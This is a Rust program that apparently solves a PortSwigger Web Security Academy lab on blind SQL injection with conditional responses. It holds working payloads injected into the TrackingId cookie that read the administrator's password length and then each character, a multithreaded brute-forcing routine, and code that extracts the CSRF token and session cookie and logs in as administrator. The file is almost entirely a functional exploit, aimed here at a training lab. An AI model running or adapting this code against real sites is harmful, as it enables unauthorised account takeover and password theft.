/***************************************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 22/9/2023
*
* Lab: Blind SQL injection with conditional responses
*
* Steps: 1. Inject payload into 'TrackingId' cookie to determine the length of
*           administrator's password based on conditional responses
*        2. Modify the payload to brute force the administrator's password
*        3. Fetch the login page
*        4. Extract csrf token and session cookie
*        5. Login as the administrator
*        6. Fetch the administrator profile
*
****************************************************************************************/
#![allow(unused)]
use lazy_static::lazy_static;
use rayon::prelude::{IntoParallelRefIterator, ParallelIterator};
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc, Mutex,
    },
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref VALID_PASSWORD: Arc<Mutex<String>> =
        Arc::new(Mutex::new(String::from("                    ")));
    static ref CHARS_FOUND: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a11005603697562837441a600bd00b1.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();
    // build the ranges; every range will be executed in different thread
    // ranges here are hardcoded from 0 to 20 which is the password length
    // you can make them dynamic or set them to what you want in the function
    let ranges = build_ranges();

    println!(
        "{} {}",
        "[#] Injection point:".blue(),
        "TrackingId".yellow(),
    );

    // determine password length
    let password_length = determine_password_length(&client, url);
    // brute force the password using multiple threads
    brute_force_password(&client, url, ranges);

    print!("\n{}", "3. Fetching login page.. ".white());
    io::stdout().flush();
    // fetch the login page
    let fetch_login = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch login page".red()));
    println!("{}", "OK".green());
    // println!("{:?}", fetch_login.headers());

    print!(
        "{}",
        "4. Extracting csrf token and session cookie.. ".white()
    );
    io::stdout().flush();
    // extract session cookie
    let session = extract_session_multiple_cookies(fetch_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    let csrf =
        extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
    println!("{}", "OK".green());

    print!("{}", "5. Logging in as the administrator.. ".white(),);
    io::stdout().flush();
    // login as the administrator
    let admin_login = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &VALID_PASSWORD.lock().unwrap()),
            ("csrf", &csrf),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to login as the administrator".red()
        ));
    println!("{}", "OK".green());

    // extract the new session
    let new_session = extract_session_cookie(admin_login.headers()).expect(&format!(
        "{}",
        "[!] Failed to extract new session cookie".red()
    ));

    // fetch administrator page
    print!("{}", "6. Fetching the administrator profile.. ".white(),);
    io::stdout().flush();
    let admin = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={new_session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch administrator profile".red()
        ));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*********************************************************************
* Function used to build a set of ranges
* Every range will be in one thread
* Feel free to change the number of vectors and the range in each one
**********************************************************************/
fn build_ranges() -> Vec<Vec<i32>> {
    let mut list = Vec::new();
    list.push((0..5).collect::<Vec<i32>>());
    list.push((5..10).collect::<Vec<i32>>());
    list.push((10..15).collect::<Vec<i32>>());
    list.push((15..21).collect::<Vec<i32>>());
    list
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from multiple cookies
***********************************************************/
fn extract_session_multiple_cookies(headers: &HeaderMap) -> Option<String> {
    let cookie = headers
        .get_all("set-cookie")
        .iter()
        .nth(1)
        .unwrap()
        .to_str()
        .unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.find(text) {
        Some(text.as_str().to_string())
    } else {
        None
    }
}

/*******************************************
* Function to determine password length
********************************************/
fn determine_password_length(client: &Client, url: &str) -> usize {
    let mut length = 0;
    for i in 1..50 {
        print!(
            "\r{} {}",
            "1. Checking if password length =".white(),
            i.to_string().yellow()
        );
        io::stdout().flush();
        // payload to determine password length
        let determine_length_payload = format!(
            "' or length((select password from users where username = 'administrator')) = {} -- -",
            i
        );
        // fetch the page with the injected payload
        let determine_length_injection = client
            .get(format!("{url}/filter?category=Pets"))
            .header("Cookie", format!("TrackingId={determine_length_payload}"))
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload to determine password length"
                    .red()
            ));

        let mut body = determine_length_injection.text().unwrap();
        // extract the name of users table
        let welcom_text = extract_pattern("Welcome back!", &body);

        if welcom_text.is_some() {
            println!(
                " [ {} {} ]",
                "Correct length:".white(),
                i.to_string().green().bold()
            );
            length = i;
            break;
        } else {
            continue;
        }
    }
    length
}

/***********************************
* Function to brute force password
************************************/
fn brute_force_password(client: &Client, url: &str, ranges: Vec<Vec<i32>>) {
    // let mut correct_password = String::new();
    ranges.par_iter().for_each(|subrange| {
        for position in subrange {
            for character in "0123456789abcdefghijklmnopqrstuvwxyz".chars() {
                print!(
                    "\r{}",
                    "2. Brute forcing password ".white(),
                );
                io::stdout().flush();
                // payload to brute force password
                let brute_force_payload = format!(
                "' or substring((select password from users where username = 'administrator'), {}, 1) = '{}' -- -",
                position+1,
                character
            );
                // fetch the page with the injected payload
                let characters_injection = client
                .get(format!("{url}/filter?category=Pets"))
                .header("Cookie", format!("TrackingId={brute_force_payload}"))
                .send()
                .expect(&format!(
                    "{}",
                    "[!] Failed to fetch the page with the injected payload to determine password length"
                        .red()
                ));

                // body of the response
                let mut body = characters_injection.text().unwrap();
                // extract the name of users table
                let welcom_text = extract_pattern("Welcome back!", &body);

                if welcom_text.is_some() {
                    CHARS_FOUND.fetch_add(1, Ordering::Relaxed);
                    VALID_PASSWORD.lock().unwrap().replace_range(*position as usize..*position as usize +1, &character.to_string());
                    print!(
                        "({}%): {}",
                        ((CHARS_FOUND.fetch_add(0, Ordering::Relaxed) as f32 / 20.0) * 100.0) as i32,
                        VALID_PASSWORD.lock().unwrap().green().bold()
                    );
                    break;
                } else {
                    continue;
                }
            }
        }
    })
}
